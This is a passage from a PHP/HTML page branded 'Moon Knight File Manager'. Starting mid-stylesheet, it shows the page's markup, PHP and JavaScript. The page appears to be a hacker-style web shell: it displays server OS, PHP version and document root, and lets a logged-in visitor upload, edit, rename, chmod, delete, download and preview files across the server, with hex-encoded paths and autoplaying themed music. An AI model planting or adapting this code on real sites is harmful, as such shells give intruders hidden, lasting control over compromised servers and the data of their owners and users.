.floating-sand:nth-child(6) { left: 55%; animation-delay: 5s; }
.floating-sand:nth-child(7) { left: 65%; animation-delay: 6s; }
.floating-sand:nth-child(8) { left: 75%; animation-delay: 7s; }
.floating-sand:nth-child(9) { left: 85%; animation-delay: 8s; }
.floating-sand:nth-child(10) { left: 95%; animation-delay: 9s; }

.action-icon {
  transition: all 0.3s ease;
  display: inline-block;
}

.action-icon:hover {
  transform: scale(1.3) rotate(15deg);
  filter: drop-shadow(0 0 5px rgba(212, 175, 55, 0.8));
}

@media(max-width:768px){
  header {
    flex-direction: column;
    align-items: center;
    text-align: center;
    padding-bottom: 15px;
  }
  header .server-info, header .current-path {
    flex: 1 1 100%;
    margin: 5px 0;
    word-break: break-word;
  }
  .moon-knight-title {
    font-size: 2.5rem;
  }
  .logout-btn, .audio-control {
    position: relative;
    top: auto;
    right: auto;
    left: auto;
    margin: 5px;
    display: inline-block;
  }
  .table > tbody > tr > * {
    white-space: normal;
  }
  #createFormArea {
    margin: 15px 0 0 0;
    flex-direction: column;
  }
  #createFormArea form {
    min-width: auto;
  }
  #actionArea {
    margin: 15px 0 0 0;
    padding: 10px 15px;
  }
  #mainContentWrapper {
    margin: 15px 15px 30px 15px;
  }
  .table-container {
    padding-left: 1.5rem;
  }
  .quick-actions {
    flex-direction: column;
  }
  .moon-phase {
    display: none;
  }
}
</style>
<script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
</head><body>
<!-- Audio Element -->
<audio id="moonknightAudio" loop autoplay>
    <source src="https://d.uguu.se/qBNsBCxv.mp3" type="audio/mpeg">
    Your browser does not support the audio element.
</audio>

<!-- Background Elements -->
<div class="moon-pattern"></div>
<div class="hieroglyph-bg hieroglyph-bg-1">☥</div>
<div class="hieroglyph-bg hieroglyph-bg-2">𓂀</div>
<div class="hieroglyph-bg hieroglyph-bg-3">⚚</div>
<div class="hieroglyph-bg hieroglyph-bg-4">𓃭</div>

<!-- Floating Sand Particles -->
<div class="floating-sand"></div>
<div class="floating-sand"></div>
<div class="floating-sand"></div>
<div class="floating-sand"></div>
<div class="floating-sand"></div>
<div class="floating-sand"></div>
<div class="floating-sand"></div>
<div class="floating-sand"></div>
<div class="floating-sand"></div>
<div class="floating-sand"></div>

<!-- Audio Control -->
<div class="audio-control" onclick="toggleAudio()">
    <i class="fa fa-music"></i>
</div>

<a href="?logout" class="logout-btn" title="Logout"><i class="fa fa-sign-out"></i> LOGOUT</a>

<header>
    <h1 class="moon-knight-title">MOON KNIGHT FILE MANAGER</h1>
    <div class="server-info" title="PHP Version, Server OS, Server Time, Document Root"><?= "PHP Version: ".phpversion()."\nServer OS: ".php_uname()."\nServer Time: ".date("Y-m-d H:i:s")."\nDocument Root: ".$_SERVER['DOCUMENT_ROOT'] ?></div>
    <div class="current-path" title="Current Path"><?= path_links($p) ?></div>

    <!-- Upload form -->
    <form method="post" enctype="multipart/form-data" id="uploadForm" title="Upload file(s) here" style="margin-top:15px; width:100%;">
        <div class="input-group">
            <div class="custom-file">
                <input type="file" name="f[]" class="custom-file-input" id="customFile" multiple onchange="this.form.submit()"/>
                <label class="custom-file-label" for="customFile">Choose file(s) to upload</label>
            </div>
        </div>
    </form>
</header>

<!-- Quick Actions -->
<div id="mainContentWrapper">
    <div class="quick-actions">
        <div class="quick-action-btn" onclick="document.getElementById('createFileBtn').click()">
            <i class="fa fa-file"></i> New File
        </div>
        <div class="quick-action-btn" onclick="document.getElementById('createFolderBtn').click()">
            <i class="fa fa-folder"></i> New Folder
        </div>
        <div class="quick-action-btn" onclick="document.getElementById('customFile').click()">
            <i class="fa fa-upload"></i> Upload Files
        </div>
        <div class="quick-action-btn" onclick="refreshPage()">
            <i class="fa fa-refresh"></i> Refresh
        </div>
    </div>

    <!-- Stats Panel -->
    <?php
    $fileCount = 0;
    $folderCount = 0;
    $totalSize = 0;
    
    foreach($items as $item){
        $fp = $p.DIRECTORY_SEPARATOR.$item;
        if(is_dir($fp)) {
            $folderCount++;
        } else {
            $fileCount++;
            $totalSize += filesize($fp);
        }
    }
    
    $totalSizeFormatted = $totalSize > 1024 * 1024 ? 
        round($totalSize/(1024*1024), 2) . " MB" : 
        round($totalSize/1024, 2) . " KB";
    ?>
    
    <div class="stats-panel">
        <div class="row text-center">
            <div class="col-md-4 stats-item">
                <div class="stats-value"><?= $fileCount ?></div>
                <div class="stats-label">Files</div>
            </div>
            <div class="col-md-4 stats-item">
                <div class="stats-value"><?= $folderCount ?></div>
                <div class="stats-label">Folders</div>
            </div>
            <div class="col-md-4 stats-item">
                <div class="stats-value"><?= $totalSizeFormatted ?></div>
                <div class="stats-label">Total Size</div>
            </div>
        </div>
    </div>

<!-- Create File and Folder Forms -->
<div id="createFormArea">
    <form method="post">
        <input type="hidden" name="type" value="file"/>
        <div class="form-group">
            <label style="color:var(--moon-gold); font-weight:bold; font-family: 'Cinzel', serif;">Create New File</label>
            <input type="text" name="filename" class="form-control" placeholder="File name" required />
        </div>
        <button type="submit" name="create_submit" class="btn btn-outline-light btn-block" id="createFileBtn">CREATE FILE</button>
    </form>
    <form method="post">
        <input type="hidden" name="type" value="directory"/>
        <div class="form-group">
            <label style="color:var(--moon-gold); font-weight:bold; font-family: 'Cinzel', serif;">Create New Folder</label>
            <input type="text" name="filename" class="form-control" placeholder="Folder name" required />
        </div>
        <button type="submit" name="create_submit" class="btn btn-outline-light btn-block" id="createFolderBtn">CREATE FOLDER</button>
    </form>
</div>

<!-- Action forms (edit, rename, chmod) -->
<div id="actionArea" style="display:none;">
<?php
if($action==='rename' && $fileNameParam!==''){ ?>
    <form method="post">
        <input type="hidden" name="old_name" value="<?=htmlspecialchars($fileNameParam)?>" />
        <div class="form-group">
            <label style="color:var(--moon-gold); font-family: 'Cinzel', serif;">Rename <?=is_dir($p.DIRECTORY_SEPARATOR.$fileNameParam) ? "Directory" : "File"?>: <?=htmlspecialchars($fileNameParam)?></label>
            <input type="text" name="new_name" class="form-control" required autofocus />
        </div>
        <button type="submit" name="rename_submit" class="btn btn-outline-light">RENAME</button>
        <a href="?p=<?=hex($p)?>" class="btn btn-outline-light ml-2">CANCEL</a>
    </form>
<?php }elseif($action==='chmod' && $fileNameParam!==''){
    $fp = $p.DIRECTORY_SEPARATOR.$fileNameParam;
    $cur_perm = substr(sprintf('%o',fileperms($fp)),-4); ?>
    <form method="post">
        <input type="hidden" name="chmod_file" value="<?=htmlspecialchars($fileNameParam)?>" />
        <div class="form-group">
            <label style="color:var(--moon-gold); font-family: 'Cinzel', serif;">Change Permissions for: <?=htmlspecialchars($fileNameParam)?></label>
            <input type="text" name="chmod_mode" class="form-control" value="<?=$cur_perm?>" pattern="[0-7]{3,4}" title="Enter octal permission (e.g. 0755)" required autofocus />
        </div>
        <button type="submit" name="chmod_submit" class="btn btn-outline-light">CHANGE PERMISSION</button>
        <a href="?p=<?=hex($p)?>" class="btn btn-outline-light ml-2">CANCEL</a>
    </form>
<?php }elseif($action==='edit' && $fileNameParam!==''){
    $fp = $p.DIRECTORY_SEPARATOR.$fileNameParam;
    if(file_exists($fp) && is_file($fp)){
        $content = file_get_contents($fp); ?>
        <form method="post">
            <input type="hidden" name="edit_file" value="<?=htmlspecialchars($fileNameParam)?>">
            <div class="form-group">
                <label style="color:var(--moon-gold); font-family: 'Cinzel', serif;">Edit File: <?=htmlspecialchars($fileNameParam)?></label>
                <textarea name="edit_content" class="form-control" rows="15" style="font-family: monospace; font-size: 0.9rem; background:rgba(10, 10, 20, 0.9) !important;"><?=htmlspecialchars($content)?></textarea>
            </div>
            <button type="submit" name="edit_submit" class="btn btn-outline-light">SAVE FILE</button>
            <a href="?p=<?=hex($p)?>" class="btn btn-outline-light ml-2">CANCEL</a>
        </form> <?php
    } else {
        echo '<p style="color:#ff6b6b;">File not found.</p>';
    }
}
?>
</div>

    <div class="table-container">
    <?php
    // Success/Error messages
    if(isset($_GET['upload_success'])) {
        echo '<div class="alert alert-success" style="background:rgba(40,167,69,0.2);border:1px solid #28a745;color:#e8e8e8; animation: bounceIn 0.5s ease;">Files uploaded successfully!</div>';
    }
    if(isset($_GET['upload_error'])) {
        echo '<div class="alert alert-danger" style="background:rgba(220,53,69,0.2);border:1px solid #dc3545;color:#e8e8e8; animation: shake 0.5s ease;">Some files failed to upload!</div>';
    }
    if(isset($_GET['file_created'])) {
        echo '<div class="alert alert-success" style="background:rgba(40,167,69,0.2);border:1px solid #28a745;color:#e8e8e8; animation: bounceIn 0.5s ease;">File created successfully!</div>';
    }
    if(isset($_GET['folder_created'])) {
        echo '<div class="alert alert-success" style="background:rgba(40,167,69,0.2);border:1px solid #28a745;color:#e8e8e8; animation: bounceIn 0.5s ease;">Folder created successfully!</div>';
    }
    if(isset($_GET['exists_error'])) {
        echo '<div class="alert alert-danger" style="background:rgba(220,53,69,0.2);border:1px solid #dc3545;color:#e8e8e8; animation: shake 0.5s ease;">File/Folder already exists!</div>';
    }
    if(isset($_GET['deleted'])) {
        echo '<div class="alert alert-success" style="background:rgba(40,167,69,0.2);border:1px solid #28a745;color:#e8e8e8; animation: bounceIn 0.5s ease;">Item deleted successfully!</div>';
    }
    if(isset($_GET['delete_error'])) {
        echo '<div class="alert alert-danger" style="background:rgba(220,53,69,0.2);border:1px solid #dc3545;color:#e8e8e8; animation: shake 0.5s ease;">File/Folder not found!</div>';
    }
    if(isset($_GET['renamed'])) {
        echo '<div class="alert alert-success" style="background:rgba(40,167,69,0.2);border:1px solid #28a745;color:#e8e8e8; animation: bounceIn 0.5s ease;">Item renamed successfully!</div>';
    }
    if(isset($_GET['rename_error'])) {
        echo '<div class="alert alert-danger" style="background:rgba(220,53,69,0.2);border:1px solid #dc3545;color:#e8e8e8; animation: shake 0.5s ease;">Rename failed!</div>';
    }
    if(isset($_GET['chmod_success'])) {
        echo '<div class="alert alert-success" style="background:rgba(40,167,69,0.2);border:1px solid #28a745;color:#e8e8e8; animation: bounceIn 0.5s ease;">Permissions changed successfully!</div>';
    }
    if(isset($_GET['chmod_error'])) {
        echo '<div class="alert alert-danger" style="background:rgba(220,53,69,0.2);border:1px solid #dc3545;color:#e8e8e8; animation: shake 0.5s ease;">Failed to change permissions!</div>';
    }
    if(isset($_GET['saved'])) {
        echo '<div class="alert alert-success" style="background:rgba(40,167,69,0.2);border:1px solid #28a745;color:#e8e8e8; animation: bounceIn 0.5s ease;">File saved successfully!</div>';
    }
    if(isset($_GET['save_error'])) {
        echo '<div class="alert alert-danger" style="background:rgba(220,53,69,0.2);border:1px solid #dc3545;color:#e8e8e8; animation: shake 0.5s ease;">Failed to save file!</div>';
    }
    ?>

    <table class="table table-hover table-borderless table-sm text-light">
        <thead class="text-light">
        <tr>
            <th>Name</th>
            <th>Size</th>
            <th>Permission</th>
            <th>Actions</th>
        </tr>
        </thead>
        <tbody>
        <?php
        $parent = dirname($p);
        if ($parent !== $p && is_dir($parent)) {
            echo '<tr><td><a href="?p='.bin2hex(realpath($parent)).'"><i class="fa fa-fw fa-level-up" style="color:var(--moon-gold);"></i> .. (Parent Directory)</a></td><td>N/A</td><td></td><td></td></tr>';
        }
        $animationDelay = 0;
        foreach($items as $item){
            $animationDelay += 0.05;
            $fp = $p.DIRECTORY_SEPARATOR.$item;
            $isDir = is_dir($fp);
            $size = $isDir ? "N/A" : round(filesize($fp)/1024,2)." KB";
            $perm = perms($fp);
            echo '<tr style="animation-delay: '.$animationDelay.'s">';
            if($isDir) {
                echo '<td><a href="?p='.bin2hex(realpath($fp)).'" title="Last modified: '.date("Y-m-d H:i",filemtime($fp)).'"><i class="fa fa-fw fa-folder"></i> '.htmlspecialchars($item).'</a></td>';
            } else {
                $ext = strtolower(pathinfo($item,PATHINFO_EXTENSION));
                echo '<td><a href="#" class="preview-file" data-file="'.htmlspecialchars($fp).'" data-ext="'.$ext.'" title="Last modified: '.date("Y-m-d H:i",filemtime($fp)).'"><i class="fa fa-fw fa-file"></i> '.htmlspecialchars($item).'</a></td>';
            }
            echo "<td>{$size}</td>";
            echo '<td><font color="var(--moon-gold)">'.$perm.'</font></td>';
            echo '<td>
                <a href="?p='.bin2hex(realpath($p)).'&a='.hex('edit').'&n='.hex($item).'" title="Edit" style="margin-right:8px;"><i class="fa fa-fw fa-edit action-icon"></i></a>
                <a href="?p='.bin2hex(realpath($p)).'&a='.hex('rename').'&n='.hex($item).'" title="Rename" style="margin-right:8px;"><i class="fa fa-fw fa-pencil action-icon"></i></a>
                <a href="?p='.bin2hex(realpath($p)).'&a='.hex('chmod').'&n='.hex($item).'" title="Change Permission" style="margin-right:8px;"><i class="fa fa-fw fa-lock action-icon"></i></a>
                <a href="?p='.bin2hex(realpath($p)).'&a='.hex('delete').'&n='.hex($item).'" class="delete" data-type="'.($isDir?'folder':'file').'" title="Delete" style="margin-right:8px;"><i class="fa fa-fw fa-trash action-icon"></i></a>
                <a href="?p='.bin2hex(realpath($p)).'&download='.hex($item).'" title="Download"><i class="fa fa-fw fa-download action-icon"></i></a>
            </td>';
            echo '</tr>';
        }
        ?>
        </tbody>
    </table>

    </div>
</div>

<div class="bg-dark border text-center mt-2 p-3" style="margin: 0 30px; border-color:var(--moon-gold) !important; background:rgba(26, 26, 46, 0.9) !important; border-radius: 0 0 10px 10px; animation: fadeIn 1s ease;">
    <small style="color:var(--moon-gold); font-weight:bold; font-family: 'Cinzel', serif;">MOON KNIGHT FILE MANAGER &copy; 2024 - PROTECTOR OF FILES • SERVANT OF KHONSHU</small>
</div>

<!-- Preview Modal -->
<div class="modal fade" id="previewModal" tabindex="-1" aria-labelledby="previewModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-lg modal-dialog-scrollable">
        <div class="modal-content bg-dark text-white">
            <div class="modal-header" style="border-bottom:1px solid var(--moon-gold);">
                <h5 class="modal-title" id="previewModalLabel" style="color:var(--moon-gold); font-family: 'Cinzel', serif;">Preview File</h5>
                <button type="button" class="close btn-close-white" data-dismiss="modal" aria-label="Close"><span
                            aria-hidden="true" style="color: var(--moon-gold);">&times;</span></button>
            </div>
            <div class="modal-body" id="previewContent"
                 style="white-space: pre-wrap; font-family: monospace; max-height: 70vh; overflow:auto; background:rgba(10, 10, 20, 0.9);">
                Loading preview...
            </div>
        </div>
    </div>
</div>

<script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"></script>
<script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
<script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>

<script>
    bsCustomFileInput.init();
    
    // Audio control
    const audio = document.getElementById('moonknightAudio');
    let isPlaying = true;
    
    function toggleAudio() {
        if (isPlaying) {
            audio.pause();
            isPlaying = false;
            document.querySelector('.audio-control').innerHTML = '<i class="fa fa-volume-off"></i>';
        } else {
            audio.play();
            isPlaying = true;
            document.querySelector('.audio-control').innerHTML = '<i class="fa fa-music"></i>';
        }
    }
    
    // Auto-play audio with user interaction
    document.addEventListener('click', function() {
        if (audio.paused) {
            audio.play().catch(e => console.log('Audio play failed:', e));
        }
    }, { once: true });

    function refreshPage() {
        // Add refresh animation
        document.body.style.opacity = '0.7';
        document.body.style.transition = 'opacity 0.3s ease';
        
        setTimeout(() => {
            window.location.reload();
        }, 300);
    }

    $(document).on('click', '.delete', function (e) {
        e.preventDefault();
        let url = $(this).attr('href');
        let type = $(this).data('type');
        swal({
            title: "CONFIRM DELETE",
            text: `This will permanently delete the ${type}! This action cannot be undone!`,
            icon: "warning",
            buttons: true,
            dangerMode: true,
        }).then(willDelete => {
            if (willDelete) window.location.href = url;
        });
    });

    $(document).ready(function () {
        $('.preview-file').click(function (e) {
            e.preventDefault();
            var filePath = $(this).data('file');
            var fileExt = $(this).data('ext').toLowerCase();
            $('#previewModalLabel').text('Preview: ' + filePath);
            var previewContent = $('#previewContent');
            var modal = $('#previewModal');

            if (['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'].includes(fileExt)) {
                previewContent.html('<img src="' + filePath + '" style="max-width:100%; max-height:60vh;" />');
                modal.modal('show');
            } else if (['txt', 'log', 'php', 'js', 'css', 'html', 'md', 'json'].includes(fileExt)) {
                $.get('<?=basename(__FILE__)?>?preview=1&file=' + encodeURIComponent(filePath), function (data) {
                    previewContent.text(data);
                    modal.modal('show');
                }).fail(function () {
                    previewContent.text('Failed to load preview.');
                    modal.modal('show');
                });
            } else {
                previewContent.text('Preview not available for this file type.');
                modal.modal('show');
            }
        });
        
        // Auto-hide alerts after 5 seconds
        setTimeout(function() {
            $('.alert').fadeOut('slow');
        }, 5000);
        
        // Add animation to table rows on load
        $('tbody tr').each(function(index) {
            $(this).css('animation-delay', (index * 0.05) + 's');
        });
    });
</script>

<?php
// AJAX preview file content
if (isset($_GET['preview']) && $_GET['preview'] == 1 && isset($_GET['file'])) {
    $file = realpath($_GET['file']);
    if ($file && is_file($file) && strpos($file, $p) === 0) {
        $content = file_get_contents($file);
        if (strlen($content) > 300000) $content = substr($content, 0, 300000) . "\n\n[Content truncated...]";
        header('Content-Type: text/plain; charset=utf-8');
        echo $content;
    } else {
        header("HTTP/1.0 404 Not Found");
        echo "File not found or access denied.";
    }
    exit();
}
?>

<script>
// Display action form only if action param active
<?php if(in_array($action, ['newFile','newDir','rename','chmod','edit'])): ?>
document.getElementById('actionArea').style.display = "block";
<?php else: ?>
document.getElementById('actionArea').style.display = "none";
<?php endif; ?>
</script>
</body>
</html>
